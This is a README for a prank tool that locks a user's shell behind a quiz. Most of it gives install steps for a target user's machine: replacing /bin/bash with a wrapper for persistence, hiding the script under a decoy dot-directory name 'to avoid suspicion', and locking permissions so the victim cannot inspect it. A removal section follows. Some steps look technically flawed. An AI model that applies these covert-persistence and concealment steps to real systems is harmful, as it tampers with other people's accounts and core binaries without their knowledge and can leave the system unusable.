# BrainRotQuiz

A terminal lockout quiz that forces users to identify brainrot characters before accessing their shell. Designed for cyber competitions and pranks.

## Installation

### Option 1: Add to bashrc

Add the following line to the target user's `~/.bashrc`:

```bash
source /path/to/brainrot_quiz.sh
```

### Option 2: Symlink over /bin/bash (more persistent)

1. Move the real bash binary:

```bash
sudo mv /bin/bash /bin/.bash_real
```

2. Create a wrapper script at `/bin/bash`:

```bash
sudo tee /bin/bash << 'EOF'
#!/bin/.bash_real
source /path/to/brainrot_quiz.sh
exec /bin/.bash_real
EOF
sudo chmod 755 /bin/bash
```

This forces the quiz on every new bash session, even if the user removes their bashrc entry.

### Hiding the quiz

- Hide the script in a dot directory:

```bash
sudo mkdir -p /usr/local/share/.config
sudo cp brainrot_quiz.sh /usr/local/share/.config/.session_init.sh
```

- Use a generic name in bashrc to avoid suspicion:

```bash
# In ~/.bashrc
[ -f /usr/local/share/.config/.session_init.sh ] && source /usr/local/share/.config/.session_init.sh
```

- Remove read permissions for the user so they can't inspect it:

```bash
sudo chown root:root /usr/local/share/.config/.session_init.sh
sudo chmod 711 /usr/local/share/.config/.session_init.sh
```

## Removal

### If installed via bashrc

Remove the `source` line from `~/.bashrc`, then reload:

```bash
source ~/.bashrc
```

### If installed via /bin/bash symlink

Restore the original bash binary:

```bash
sudo mv /bin/.bash_real /bin/bash
```

### Full cleanup

```bash
sudo rm -f /usr/local/share/.config/.session_init.sh
sed -i '/session_init/d' ~/.bashrc
```
